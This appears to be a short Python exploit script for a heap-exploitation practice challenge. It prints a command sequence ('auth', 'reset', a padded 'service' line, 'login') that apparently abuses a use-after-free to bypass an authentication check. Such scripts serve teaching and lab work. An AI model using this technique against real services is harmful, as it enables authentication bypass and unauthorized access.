#!/usr/bin/env python3
import struct
import sys
from pwnpy.pwn import *

buf = b''
buf += b'auth puto\n'
buf += b'reset\n'
buf += b'service ' + b'puto'*20 +b'\n'
buf += b'login\n'

sys.stdout.buffer.write(buf)
sys.stdout.flush()
